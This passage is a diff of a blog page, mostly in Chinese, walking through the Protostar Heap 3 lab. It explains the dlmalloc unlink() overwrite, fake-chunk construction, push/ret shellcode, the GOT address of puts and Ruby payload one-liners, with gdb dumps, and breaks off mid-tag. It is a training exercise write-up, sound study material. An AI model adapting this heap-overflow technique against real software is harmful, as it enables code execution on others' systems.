@@ -1,17 +1,18 @@
 <!DOCTYPE html>
 <html lang="en-us" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='draft'><title>Protostar Format 3 Walkthrough</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='dlmalloc, using unlink()'><title>Protostar Heap 3 Walkthrough</title>
 
 <link rel='canonical' href='/p/protostar_heap_3/'>
 
-<link rel="stylesheet" href="/scss/style.min.46f4bd7833d4596a6e839caf393b83bf3fede00131b473e260f83d5a9f629895.css"><meta property='og:title' content='Protostar Format 3 Walkthrough'>
-<meta property='og:description' content='draft'>
+<link rel="stylesheet" href="/scss/style.min.46f4bd7833d4596a6e839caf393b83bf3fede00131b473e260f83d5a9f629895.css"><meta property='og:title' content='Protostar Heap 3 Walkthrough'>
+<meta property='og:description' content='dlmalloc, using unlink()'>
 <meta property='og:url' content='/p/protostar_heap_3/'>
 <meta property='og:site_name' content='Welcome to Rokkenjima'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2022-04-06T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-04-06T00:00:00&#43;00:00'/>
-<meta name="twitter:title" content="Protostar Format 3 Walkthrough">
-<meta name="twitter:description" content="draft">
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2022-04-07T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-04-07T00:00:00&#43;00:00'/><meta property='og:image' content='/p/protostar_heap_3/cover.png' />
+<meta name="twitter:title" content="Protostar Heap 3 Walkthrough">
+<meta name="twitter:description" content="dlmalloc, using unlink()"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='/p/protostar_heap_3/cover.png' />
     <link rel="shortcut icon" href="favicon.ico" />
 
     </head>
@@ -218,8 +219,20 @@
     </ol>
 </aside>
 <main class="main full-width">
-    <article class="main-article">
+    <article class="has-image main-article">
     <header class="article-header">
+        <div class="article-image">
+            <a href="/p/protostar_heap_3/">
+                <img src="/p/protostar_heap_3/cover_hud197c5c2d1e77fe2755d8059e7f96b09_578561_800x0_resize_box_3.png"
+                        srcset="/p/protostar_heap_3/cover_hud197c5c2d1e77fe2755d8059e7f96b09_578561_800x0_resize_box_3.png 800w, /p/protostar_heap_3/cover_hud197c5c2d1e77fe2755d8059e7f96b09_578561_1600x0_resize_box_3.png 1600w"
+                        width="800" 
+                        height="461" 
+                        loading="lazy"
+                        alt="Featured image of post Protostar Heap 3 Walkthrough" />
+                
+            </a>
+        </div>
+    
 
     <div class="article-details">
     
@@ -229,12 +242,8 @@
                 Binary
             </a>
         
-            <a href="/categories/heap/" >
+            <a href="/categories/heap/" style="background-color: #262626; color: #fff;">
                 Heap
-            </a>
-        
-            <a href="/categories/ruby/" style="background-color: #df7988; color: #fff;">
-                Ruby
             </a>
         
     </header>
@@ -242,12 +251,12 @@
 
     <div class="article-title-wrapper">
         <h2 class="article-title">
-            <a href="/p/protostar_heap_3/">Protostar Format 3 Walkthrough</a>
+            <a href="/p/protostar_heap_3/">Protostar Heap 3 Walkthrough</a>
         </h2>
     
         
         <h3 class="article-subtitle">
-            draft
+            dlmalloc, using unlink()
         </h3>
         
     </div>
@@ -265,7 +274,7 @@
   <path d="M3 11h16" />
   <path d="M18 16.496v1.504l1 1" />
 </svg>
-                <time class="article-time--published">Apr 06, 2022</time>
+                <time class="article-time--published">Apr 07, 2022</time>
             </div>
         
 
@@ -281,14 +290,17 @@
     
     
     <h2 id="references">References</h2>
-<p>其实到目前为止我并没有全部理解</p>
-<p>但是因为思路很乱有点理不清了，所以姑且把已经理解的部分记下来</p>
 <p><a class="link" href="http://phrack.org/issues/57/9.html"  target="_blank" rel="noopener"
     >Once upon a free()&hellip;</a></p>
 <p><a class="link" href="https://conceptofproof.wordpress.com/2013/11/19/protostar-heap3-walkthrough/"  target="_blank" rel="noopener"
     >Protostar Heap3 Walkthrough | conceptofproof</a></p>
+<p><a class="link" href="https://airman604.medium.com/protostar-heap-3-walkthrough-56d9334bcd13"  target="_blank" rel="noopener"
+    >Protostar Heap 3 Walkthrough | Airman</a></p>
 <p><a class="link" href="https://youtu.be/HWhzH--89UQ"  target="_blank" rel="noopener"
     >The Heap: dlmalloc unlink() exploit - bin 0x18</a></p>
+<p>其实起笔的时候还并不是特别理解</p>
+<p>但是因为思路很乱有点理不清了，所以姑且把已经理解的部分记下来</p>
+<p>然后写着写着就逐渐理解一切x</p>
 <hr>
 <h2 id="dlmalloc-basics">Dlmalloc Basics</h2>
 <p>使用中的 chunk：</p>
@@ -445,55 +457,340 @@ nextchunk -&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 </span></span><span class="line"><span class="cl">  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;dynamite failed?</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><hr>
-<p>我们的目标是把 <code>puts()</code> 在 Global Offset Table 中记录的地址上，写上能跳转到 <code>winner()</code> 的 shellcode</p>
-<p><a class="link" href="http://shell-storm.org/online/Online-Assembler-and-Disassembler/"  target="_blank" rel="noopener"
-    >可使用这个工具</a></p>
-<pre tabindex="0"><code>push 0x08048864
+<h2 id="before-unlink">Before <code>unlink()</code></h2>
+<p>我们的目标是把 <code>puts()</code> 在动态链接表中记录的地址，写上能跳转到 <code>winner()</code> 的 shellcode</p>
+<p>而能帮我们达到以上目的的函数就是 <code>free()</code>， 准确来说是 <code>unlink()</code>，思路如下：</p>
+<br>
+<p>从现在开始全部考虑代码，不要看上面的流程图：</p>
+<p>首先，我们所需要的地址有两个：<strong><code>puts()</code> 在 GOT 上的地址</strong> 和 <strong>指向 <code>winner()</code> shellcode 的地址</strong></p>
+<p>再看一遍源码， <code>unlink()</code> 分为四个步骤：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">BK</span> <span class="o">=</span> <span class="n">P</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>       
+</span></span><span class="line"><span class="cl"><span class="n">FD</span> <span class="o">=</span> <span class="n">P</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">FD</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">BK</span><span class="p">;</span>            
+</span></span><span class="line"><span class="cl"><span class="n">BK</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">FD</span><span class="p">;</span>
+</span></span></code></pre></div><p>还记得一个 chunk 的模型么，<code>prev_size</code>, <code>size</code>, <code>fd</code>, <code>bk</code> 都是 4 bytes</p>
+<p>所以出现 <code>P-&gt;fd</code> 时，实际你可以将其看作 <code>P + 0x8</code></p>
+<p>出现 <code>P-&gt;bk</code> 时，实际你可以将其看作 <code>P + 0xc</code></p>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>堆中一个已被 free 的 chunk 的模型</th>
+<th>指针（↑表示在一格的起始处）</th>
+<th>大小</th>
+<th>可以视作</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>prev_size</code></td>
+<td>↑ chunk begins (P)</td>
+<td>4 bytes</td>
+<td>P + 0x0</td>
+</tr>
+<tr>
+<td><code>size</code></td>
+<td></td>
+<td>4 bytes</td>
+<td>P + 0x4</td>
+</tr>
+<tr>
+<td><code>fd</code></td>
+<td>↑ mem begins</td>
+<td>4 bytes</td>
+<td>P + 0x8</td>
+</tr>
+<tr>
+<td><code>bk</code></td>
+<td></td>
+<td>4 bytes</td>
+<td>P + 0xc</td>
+</tr>
+</tbody>
+</table></div>
+<p>如果我们把 <code>P-&gt;bk</code> 换成 <code>addr of shellcode</code>，把 <code>P-&gt;fd</code> 换成 <code>addr of puts()</code></p>
+<p>接下来详细展开一下三四步，等量替换：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="mf">1.</span>
+</span></span><span class="line"><span class="cl"><span class="n">BK</span> <span class="o">=</span> <span class="n">P</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>    
+</span></span><span class="line"><span class="cl"><span class="mf">2.</span>
+</span></span><span class="line"><span class="cl"><span class="n">FD</span> <span class="o">=</span> <span class="n">P</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mf">3.</span>
+</span></span><span class="line"><span class="cl"><span class="n">FD</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">BK</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="err">↓</span>
+</span></span><span class="line"><span class="cl"><span class="n">BK</span> <span class="o">==</span> <span class="n">P</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">==</span> <span class="n">addr</span> <span class="n">of</span> <span class="n">shellcode</span>
+</span></span><span class="line"><span class="cl"><span class="n">FD</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">==</span> <span class="n">FD</span><span class="o">+</span><span class="mh">0xc</span> <span class="o">==</span> <span class="n">P</span><span class="o">-&gt;</span><span class="n">fd</span><span class="o">+</span><span class="mh">0xc</span> <span class="o">==</span> <span class="n">addr</span> <span class="n">of</span> <span class="n">puts</span><span class="o">+</span><span class="mh">0xc</span>
+</span></span><span class="line"><span class="cl"><span class="err">↓</span>
+</span></span><span class="line"><span class="cl"><span class="n">FD</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">BK</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">equals</span>
+</span></span><span class="line"><span class="cl"><span class="n">addr</span> <span class="n">of</span> <span class="nf">puts</span><span class="p">()</span><span class="o">+</span><span class="mh">0xc</span> <span class="o">=</span> <span class="n">addr</span> <span class="n">of</span> <span class="n">shellcode</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mf">4.</span> 
+</span></span><span class="line"><span class="cl"><span class="n">BK</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">FD</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="err">↓</span>
+</span></span><span class="line"><span class="cl"><span class="n">FD</span> <span class="o">==</span> <span class="n">P</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">==</span> <span class="n">addr</span> <span class="n">of</span> <span class="n">puts</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">BK</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">==</span> <span class="n">BK</span><span class="o">+</span><span class="mh">0x8</span> <span class="o">==</span> <span class="n">P</span><span class="o">-&gt;</span><span class="n">bk</span><span class="o">+</span><span class="mh">0x8</span> <span class="o">==</span> <span class="n">addr</span> <span class="n">of</span> <span class="n">shellcode</span><span class="o">+</span><span class="mh">0x8</span>
+</span></span><span class="line"><span class="cl"><span class="err">↓</span>
+</span></span><span class="line"><span class="cl"><span class="n">BK</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">FD</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">equals</span>
+</span></span><span class="line"><span class="cl"><span class="n">addr</span> <span class="n">of</span> <span class="n">shellcode</span><span class="o">+</span><span class="mh">0x8</span> <span class="o">=</span> <span class="n">addr</span> <span class="n">of</span> <span class="n">puts</span><span class="p">()</span>
+</span></span></code></pre></div><p>出现了！</p>
+<p><code>addr of puts()+0xc</code> = <code>addr of shellcode</code></p>
+<p>这就是我们想要的结果！</p>
+<p>但是还不太对，这边的 <code>addr of puts()</code> 大了 <code>0xC</code>，<strong>所以一开始就应该使 <code>P-&gt;fd</code> = <code>addr of puts() - 0xc</code></strong></p>
+<p>而且在第四步还出现了 <code>addr of shellcode+0x8 = addr of puts()</code>，也就是说这个 shellcode + <code>0x8</code> 的位置会被 <code>unlink()</code> 写上 <code>addr of puts()</code>&hellip;</p>
+<p>所以 shellcode 得小于 8 bytes&hellip;？</p>
+<p><del>对了但没完全对</del> 请继续往后看吧</p>
+<hr>
+<p>总之接下来找找到 <code>puts()</code> 在动态链接表里的地址</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@protostar:/tmp/heap$ objdump -R /opt/protostar/bin/heap3
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/opt/protostar/bin/heap3:     file format elf32-i386
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">DYNAMIC RELOCATION RECORDS
+</span></span><span class="line"><span class="cl">OFFSET   TYPE              VALUE 
+</span></span><span class="line"><span class="cl">0804b0e4 R_386_GLOB_DAT    __gmon_start__
+</span></span><span class="line"><span class="cl">0804b140 R_386_COPY        stderr
+</span></span><span class="line"><span class="cl">0804b0f4 R_386_JUMP_SLOT   __errno_location
+</span></span><span class="line"><span class="cl">0804b0f8 R_386_JUMP_SLOT   mmap
+</span></span><span class="line"><span class="cl">0804b0fc R_386_JUMP_SLOT   sysconf
+</span></span><span class="line"><span class="cl">0804b100 R_386_JUMP_SLOT   __gmon_start__
+</span></span><span class="line"><span class="cl">0804b104 R_386_JUMP_SLOT   mremap
+</span></span><span class="line"><span class="cl">0804b108 R_386_JUMP_SLOT   memset
+</span></span><span class="line"><span class="cl">0804b10c R_386_JUMP_SLOT   __libc_start_main
+</span></span><span class="line"><span class="cl">0804b110 R_386_JUMP_SLOT   sbrk
+</span></span><span class="line"><span class="cl">0804b114 R_386_JUMP_SLOT   memcpy
+</span></span><span class="line"><span class="cl">0804b118 R_386_JUMP_SLOT   strcpy
+</span></span><span class="line"><span class="cl">0804b11c R_386_JUMP_SLOT   <span class="nb">printf</span>
+</span></span><span class="line"><span class="cl">0804b120 R_386_JUMP_SLOT   fprintf
+</span></span><span class="line"><span class="cl">0804b124 R_386_JUMP_SLOT   <span class="nb">time</span>
+</span></span><span class="line"><span class="cl">0804b128 R_386_JUMP_SLOT   puts
+</span></span><span class="line"><span class="cl">0804b12c R_386_JUMP_SLOT   munmap
+</span></span></code></pre></div><pre tabindex="0"><code>0x0804b128 - 0xc = 0x0804b11c
+</code></pre><p>以及 <code>winner()</code> 的地址：</p>
+<pre tabindex="0"><code>user@protostar:/tmp/heap$ objdump -t /opt/protostar/bin/heap3 | grep winner
+08048864 g     F .text	00000025              winner
+</code></pre><p>把它做成 shellcode，使用<a class="link" href="http://shell-storm.org/online/Online-Assembler-and-Disassembler/"  target="_blank" rel="noopener"
+    >这个工具</a></p>
+<pre tabindex="0"><code># x86 (32)
+push 0x08048864
 ret
 
-Assembly - Little Endian:
+# Assembly - Little Endian
 &#34;\x68\x64\x88\x04\x08\xc3&#34;
-</code></pre><p>而能帮我们达到以上目的的函数就是 <code>free()</code>， 准确来说是 <code>unlink()</code>，思路如下：</p>
-<p>首先 <code>strcpy()</code> 不会检查字符数量，所以可以在堆上写多于 buffer 大小的字符</p>
-<p>还记得前面提到的 <code>unlink()</code> 么，它可以往 <code>P-&gt;fd</code> 和 <code>P-&gt;bk</code> 上写值</p>
-<p>这样的话我们可以通过指向 chunk A 的 第一个 <code>strcpy()</code> 在堆上写出一个 fake chunk，</p>
-<p>并欺骗 <code>free()</code> 函数（和里面的  <code>unlink()</code> ），让它以为 fake chunk 在即将被 <code>free()</code> 的 chunk 之前，以此欺骗  <code>unlink()</code> 往我们所想要的地址写值</p>
-<p>而这个「即将被 free 的 chunk」我们就用 chunk B 吧，</p>
-<p>那么 chunk B应具有以下特点：</p>
+</code></pre><p>啊..但是差点忘了一件事情，就是我们还没弄出一个 <code>P-&gt;bk</code> = <code>addr of shellcode</code> 且 <code>P-&gt;fd</code> = <code>addr of puts() - 0xc</code> 的 chunk 呢&hellip;</p>
+<hr>
+<h2 id="creating-a-fake-chunk">Creating a fake chunk</h2>
+<p>首先 <code>strcpy()</code> 不会检查字符数量，所以可以在堆上写多于 <code>malloc(32)</code> 的字符</p>
+<p>我们现在要创建一个这样的 chunk：</p>
+<pre tabindex="0"><code>    chunk -&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+             | prev_size: no idea                                      |
+             +---------------------------------------------------------+
+             | size: no idea                                           |
+      mem -&gt; +---------------------------------------------------------+
+             | fd: addr of puts() minus 0x12                           |
+             +---------------------------------------------------------+
+             | bk: addr of shellcode                                   |
+             +---------------------------------------------------------+
+</code></pre><p>而且我们必须要让 <code>unlink()</code> 这个函数被执行&hellip;这就出现了两个先决条件：</p>
 <ol>
-<li>
-<p><code>size</code> 大小大于 64 bytes
-不然会使用 <code>fastbin</code> 而不是双向链表
-实现思路是让 <code>size</code> 大于 64（废话</p>
-</li>
-<li>
-<p>前一个 chunk 看起来已被 free
-不然就不会 <code>unlink()</code> 函数连接来两个双向链表
-实现思路是让 <code>size</code> 的最后一个比特为零</p>
-</li>
+<li>前一个 chunk 也得是被 free 了的</li>
+<li>这个 chunk 和 前一个 chunk 的 <code>size</code> 都得大于 64 bytes 不然就会使用 <code>fastbin</code> 而不是双向链表</li>
 </ol>
-<p>以上两点是 <code>unlink()</code> 会被调用的先决条件
-具体实现，是</p>
-<ol>
-<li>在 <code>size</code> 写一个负值 <code>0xfffffffc</code>，即 <code>-4</code></li>
-</ol>
-<p>这个值在同时满足以上条件的同时，还有另一个特点，就是在计算下一个 chunk 时，使用的是 <code>chunk B + size</code> 即 <code>P + (-4)</code>，那么就是在 chunk B 开头向前 4 bytes 的位置（实际上这里是 chunk A 的范围）</p>
-<ol start="2">
-<li>在 <code>prev_size</code> 上写上 <code>0xfffffff8</code>，即 <code>-8</code>，</li>
-</ol>
-<p>计算上一个 chunk 时 <code>chunk B - prev_size</code> 即 <code>chunk B - (-8)</code>，那么就是在 chunk B 开头向后 8 bytes 的位置，也就是 mem ，而这里就是我们可以通过指向 chunk B 的 mem 的第二个 <code>strcpy()</code> 来写我们的 fake chunk 的位置</p>
+<br>
+<p>还记得 malloc 标记前一个 chunk 是否被 free 的方法是：看 <code>size</code> 的最后一个比特是否被设为零，设为零即「前一个 chunk 已被 free」</p>
+<p>所以我们需要伪造一个 chunk size&hellip;需要大于 64 bytes 而且最后一个比特为零&hellip;</p>
+<p>这里有一个很聪明的做法&hellip;可以用负数，比如 <code>0xfffffff8</code> 即 <code>-8</code></p>
+<br>
+<p>而且这个 <code>-8</code> 能导致一个很有趣的特性：</p>
+<p>malloc 计算上一个 chunk 的位置的方式是：<code>P - prev_size</code></p>
+<p>那么 <code>P - (-8)</code> = <code>P + 8</code>，就是说下一个 chunk 出现在了当前 chunk 的向后 8 bytes&hellip;</p>
+<p>同时我们也可以让 <code>prev_size</code> 同理&hellip;不过具体是多少其实并不太重要因为 &hellip;姑且为了区分就设为 <code>0xfffffffc</code> 也就是 <code>-4</code> 好了</p>
+<p>结果就是，我们不需要浪费堆上很多的地址，只要在很小的一段空间里就能伪造出 BK 和 FD</p>
+<p><img src="/p/protostar_heap_3/fakechunk.png"
+	width="1730"
+	height="882"
+	srcset="/p/protostar_heap_3/fakechunk_hu5057ef92d007ec3763703f099de47c83_241847_480x0_resize_box_3.png 480w, /p/protostar_heap_3/fakechunk_hu5057ef92d007ec3763703f099de47c83_241847_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="fakechunk"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="196"
+		data-flex-basis="470px"
+	
+></p>
+<h2 id="free-a-fastbin">Free a fastbin</h2>
+<p>其实已经基本解完了&hellip;但其实还有最后一个小问题</p>
+<p>我们先用上一节的那张图片的思路来试一下吧（第三个参数完全不需要，所以随便写一个 ABCD 就行）</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@protostar:/tmp$ ruby -e <span class="s1">&#39;puts &#34;\x68\x64\x88\x04\x08\xc3&#34; + &#34;A&#34;*26 + &#34;\xf8\xff\xff\xff&#34; + &#34;\xfc\xff\xff\xff&#34;   &#39;</span> &gt; A
+</span></span><span class="line"><span class="cl">user@protostar:/tmp$ ruby -e <span class="s1">&#39;puts &#34;\xef\xbe\xad\xde&#34;*2 + &#34;\x1c\xb1\x04\x08&#34; + &#34;\x08\xc0\x04\x08&#34;   &#39;</span> &gt; B
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> r <span class="sb">`</span>cat /tmp/A<span class="sb">`</span> <span class="sb">`</span>cat /tmp/B<span class="sb">`</span> ABCD
+</span></span></code></pre></div><p>太长不看，直接进入正题，从 Heap Three 的三个 <code>free()</code> 开始吧</p>
+<p>设置四个断点，分别是第一个 <code>free()</code> 前和每个 <code>free()</code> 后</p>
+<p>直接看结果的话&hellip;</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> r <span class="sb">`</span>cat /tmp/A<span class="sb">`</span> <span class="sb">`</span>cat /tmp/B<span class="sb">`</span> ABCD
+</span></span><span class="line"><span class="cl">Starting program: /opt/protostar/bin/heap3 <span class="sb">`</span>cat /tmp/A<span class="sb">`</span> <span class="sb">`</span>cat /tmp/B<span class="sb">`</span> ABCD
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># free(c) 之前</span>
+</span></span><span class="line"><span class="cl">0x804c000:	0x00000000	0x00000029	0x04886468	0x4141c308
+</span></span><span class="line"><span class="cl">0x804c010:	0x41414141	0x41414141	0x41414141	0x41414141
+</span></span><span class="line"><span class="cl">0x804c020:	0x41414141	0x41414141	0xfffffff8	0xfffffffc
+</span></span><span class="line"><span class="cl">0x804c030:	0xdeadbeef	0xdeadbeef	0x0804b11c	0x0804c008
+</span></span><span class="line"><span class="cl">0x804c040:	0x00000000	0x00000000	0x00000000	0x00000000
+</span></span><span class="line"><span class="cl">0x804c050:	0x00000000	0x00000029	0x44434241	0x00000000
+</span></span><span class="line"><span class="cl">0x804c060:	0x00000000	0x00000000	0x00000000	0x00000000
+</span></span><span class="line"><span class="cl">0x804c070:	0x00000000	0x00000000
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Breakpoint 1, 0x08048911 in main <span class="o">(</span><span class="nv">argc</span><span class="o">=</span>4, <span class="nv">argv</span><span class="o">=</span>0xbffff804<span class="o">)</span> at heap3/heap3.c:24
+</span></span><span class="line"><span class="cl">24	in heap3/heap3.c
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># free(c) 之后</span>
+</span></span><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> c
+</span></span><span class="line"><span class="cl">Continuing.
+</span></span><span class="line"><span class="cl">0x804c000:	0x00000000	0x00000029	0x04886468	0x4141c308
+</span></span><span class="line"><span class="cl">0x804c010:	0x41414141	0x41414141	0x41414141	0x41414141
+</span></span><span class="line"><span class="cl">0x804c020:	0x41414141	0x41414141	0xfffffff8	0xfffffffc
+</span></span><span class="line"><span class="cl">0x804c030:	0xdeadbeef	0xdeadbeef	0x0804b11c	0x0804c008
+</span></span><span class="line"><span class="cl">0x804c040:	0x00000000	0x00000000	0x00000000	0x00000000
+</span></span><span class="line"><span class="cl">0x804c050:	0x00000000	0x00000029	0x00000000	0x00000000
+</span></span><span class="line"><span class="cl">0x804c060:	0x00000000	0x00000000	0x00000000	0x00000000
+</span></span><span class="line"><span class="cl">0x804c070:	0x00000000	0x00000000
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Breakpoint 2, main <span class="o">(</span><span class="nv">argc</span><span class="o">=</span>4, <span class="nv">argv</span><span class="o">=</span>0xbffff804<span class="o">)</span> at heap3/heap3.c:25
+</span></span><span class="line"><span class="cl">25	in heap3/heap3.c
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># free(b) 之后</span>
+</span></span><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> 
+</span></span><span class="line"><span class="cl">Continuing.
+</span></span><span class="line"><span class="cl">0x804c000:	0x00000000	0x00000029	0x04886468	0x4141c308
+</span></span><span class="line"><span class="cl">0x804c010:	0x0804b11c	0x41414141	0x41414141	0x41414141
+</span></span><span class="line"><span class="cl">0x804c020:	0x41414141	0xfffffff4	0xfffffff8	0xfffffffc
+</span></span><span class="line"><span class="cl">0x804c030:	0xdeadbeef	0xfffffff5	0x0804b194	0x0804b194
+</span></span><span class="line"><span class="cl">0x804c040:	0x00000000	0x00000000	0x00000000	0x00000000
+</span></span><span class="line"><span class="cl">0x804c050:	0x00000000	0x00000fb1	0x00000000	0x00000000
+</span></span><span class="line"><span class="cl">0x804c060:	0x00000000	0x00000000	0x00000000	0x00000000
+</span></span><span class="line"><span class="cl">0x804c070:	0x00000000	0x00000000
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Breakpoint 3, main <span class="o">(</span><span class="nv">argc</span><span class="o">=</span>4, <span class="nv">argv</span><span class="o">=</span>0xbffff804<span class="o">)</span> at heap3/heap3.c:26
+</span></span><span class="line"><span class="cl">26	in heap3/heap3.c
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># free(a) 之后</span>
+</span></span><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> 
+</span></span><span class="line"><span class="cl">Continuing.
+</span></span><span class="line"><span class="cl">0x804c000:	0x00000000	0x00000029	0x00000000	0x4141c308
+</span></span><span class="line"><span class="cl">0x804c010:	0x0804b11c	0x41414141	0x41414141	0x41414141
+</span></span><span class="line"><span class="cl">0x804c020:	0x41414141	0xfffffff4	0xfffffff8	0xfffffffc
+</span></span><span class="line"><span class="cl">0x804c030:	0xdeadbeef	0xfffffff5	0x0804b194	0x0804b194
+</span></span><span class="line"><span class="cl">0x804c040:	0x00000000	0x00000000	0x00000000	0x00000000
+</span></span><span class="line"><span class="cl">0x804c050:	0x00000000	0x00000fb1	0x00000000	0x00000000
+</span></span><span class="line"><span class="cl">0x804c060:	0x00000000	0x00000000	0x00000000	0x00000000
+</span></span><span class="line"><span class="cl">0x804c070:	0x00000000	0x00000000
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Breakpoint 4, main <span class="o">(</span><span class="nv">argc</span><span class="o">=</span>4, <span class="nv">argv</span><span class="o">=</span>0xbffff804<span class="o">)</span> at heap3/heap3.c:28
+</span></span><span class="line"><span class="cl">28	in heap3/heap3.c
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 出现了 Segmentation fault</span>
+</span></span><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> 
+</span></span><span class="line"><span class="cl">Continuing.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Program received signal SIGSEGV, Segmentation fault.
+</span></span><span class="line"><span class="cl">0x804c000:	0x00000000	0x00000029	0x00000000	0x4141c308
+</span></span><span class="line"><span class="cl">0x804c010:	0x0804b11c	0x41414141	0x41414141	0x41414141
+</span></span><span class="line"><span class="cl">0x804c020:	0x41414141	0xfffffff4	0xfffffff8	0xfffffffc
+</span></span><span class="line"><span class="cl">0x804c030:	0xdeadbeef	0xfffffff5	0x0804b194	0x0804b194
+</span></span><span class="line"><span class="cl">0x804c040:	0x00000000	0x00000000	0x00000000	0x00000000
+</span></span><span class="line"><span class="cl">0x804c050:	0x00000000	0x00000fb1	0x00000000	0x00000000
+</span></span><span class="line"><span class="cl">0x804c060:	0x00000000	0x00000000	0x00000000	0x00000000
+</span></span><span class="line"><span class="cl">0x804c070:	0x00000000	0x00000000
+</span></span><span class="line"><span class="cl">0x0804c024 in ?? <span class="o">()</span>
+</span></span><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> 
+</span></span><span class="line"><span class="cl">Continuing.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Program terminated with signal SIGSEGV, Segmentation fault.
+</span></span><span class="line"><span class="cl">The program no longer exists.
+</span></span><span class="line"><span class="cl">0x804c000:	Error <span class="k">while</span> running hook_stop:
+</span></span><span class="line"><span class="cl">Cannot access memory at address 0x804c000
+</span></span><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> 
+</span></span></code></pre></div><p>可能已经看出来了，对于 chunk A 和 chunk C，这两个 chunk 的 metadata 中的 <code>size</code> 是 <code>0x29</code>，即十进制 41（这里多出来的 1 就是用于标记前一个 chunk 是否被使用的 1 比特）</p>
+<p>所以 <code>size</code> 小于生成双向链表的 64 bytes&hellip;于是用的是 <code>fastbin</code> 数据结构</p>
+<p>结果在 <code>free(c)</code> 和 <code>free(a)</code> 的时候，mem的位置直接被清零了（见 <code>0x804c008</code> 和 <code>0x804c058</code>）</p>
+<p>结果 <code>0x804c008</code> 处写的 shellcode 被清掉了..</p>
+<br>
+<p>另外，<code>0x804c010</code> 也被写上了奇怪的东西&hellip;也就是</p>
+<blockquote>
+<p>而且在第四步还出现了 <code>addr of shellcode+0x8 = addr of puts()</code>，也就是说这个 shellcode + <code>0x8</code> 的位置会被 <code>unlink()</code> 写上 <code>addr of puts()</code>&hellip;</p>
+</blockquote>
+<p>这时候就又要请出 NOP 了&hellip;我们直接把 <code>0x804c008</code> 到 <code>0x804c010</code> 全写上 NOP 就好了&hellip;</p>
+<p><img src="/p/protostar_heap_3/nop.png"
